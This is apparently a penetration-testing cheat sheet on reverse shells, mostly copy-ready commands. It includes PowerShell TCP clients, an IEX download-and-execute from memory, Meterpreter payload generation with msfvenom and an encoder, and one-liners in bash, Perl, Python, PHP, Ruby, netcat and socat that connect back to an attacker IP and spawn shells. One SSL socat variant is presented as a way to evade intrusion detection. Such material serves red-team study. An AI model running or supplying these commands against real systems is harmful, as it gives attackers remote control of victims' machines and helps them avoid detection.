---
description: >-
  To gain control over a compromised system, an attacker usually aims to gain
  interactive shell access for RCE. A reverse shell is a connection back  that
  means that the victim connects to the attacker.
---

# Reverse Sell 🔙

## Windows

### Nishang

[Nishang](https://github.com/samratashok/nishang) is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

```text
Import-Module .\Invoke-PowershellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT]
```

Or you can modify the script and append the following line:

`Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT]`

And execute directly from memory:

```text
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://ip-addr:port/Invoke-PowerShellTcp.ps1')
```

{% hint style="danger" %}
Be careful, **migrate** the process to the same machine architecture!
{% endhint %}

### Netcat

Netcat is a network tool that allows through a command interpreter and with a simple syntax to open TCP / UDP ports in a HOST. It's not native from windows, so you need to trasnfer the binary.

```text
nc.exe -e powershell.exe [IP] [PORT]
```

{% hint style="danger" %}
Be careful, **migrate** the process to the same machine architecture!
{% endhint %}

### Powershell

Also we can get a reverse shell without using any external file.

```text
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ip-addr',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
```

### Powercat

Powercat is the netcat version written in powershell. Remember first download the script and import the module.

```text
powercat -c ip-addr -p port -e cmd.exe
```

### Meterpreter

First, we need to create our _shellcode_ with **msfvenom**:

```text
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 --encoder x86/shikata_ga_nai -f exe LHOST=[IP] LPORT=[PORT] > meterpreter.exe
```

After transfer our _shellcode_ to the target machine, we will **start listening** with metasploit at the same port:

```text
msf> use multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LPORT [PORT]
msf> set LHOST [IP]
msf> run
```

When we execute our _shellcode_ we will receive the **meterpreter** in the handler:

```text
.\meterpreter.exe
```

{% hint style="danger" %}
Be careful, **migrate** the process to the same machine architecture!
{% endhint %}

### Migrating the reverse shell

#### From Powershell:

```text
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
```

If they don't sahre the same architecture, we will need to create a new Revershell with the appropiate **Powershell path:**

* **For 32 bits:**

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

* **For 64 bits:**

`C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe`

#### From Meterpreter:

First we need to **list** all processes:

```text
meterpreter > ps
```

Afther getting the list of all the processs going on we can **migrate** ourselves to some reliable process:

```text
meterpreter > migrate PID
```

## Linux

There are many ways to get a reverse shell in many differents languages and using  many differents binaries. 

### Bash

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Perl

```text
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```text
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Socat

```text
socat TCP4:10.0.0.1:1234 EXEC:/bin/bash
```

### SSL Socat

Using cryptography helps to evade some types of IDS. First we need to create the certificates in out attacking machine.

```text
openssl req -newkey rsa:2048 -nodes -keyout rev_shell.key -x509 -days 362 -out rev_shell.crt
cat rev_shell.key rev_shell.crt > rev_shell.pem
```

After that on the target machine run socat with OPENSSL:

```text
socat OPENSSL:10.0.0.1:443,cert=rev_shell.pem,verify=0 EXEC:/bin/bash
```

### Improve the rev shell to TTY

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Run to background with `Ctrl + Z`

```text
stty raw -echo;fg
```

{% hint style="info" %}
**Don't use** `tmux` and `rlwrap` if you want better results.
{% endhint %}

#### References:

* [https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)
* [https://www.sniferl4bs.com/2017/04/hacking-101-reverse-shell-bind-shell.html](https://www.sniferl4bs.com/2017/04/hacking-101-reverse-shell-bind-shell.html)
* [https://securityhacklabs.net/articulo/accediendo-remotamente-a-windows-10-con-metasploit](https://securityhacklabs.net/articulo/accediendo-remotamente-a-windows-10-con-metasploit)
* [https://www.youtube.com/watch?v=fIGvOGrdxyc&t=164s](https://www.youtube.com/watch?v=fIGvOGrdxyc&t=164s)
* [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

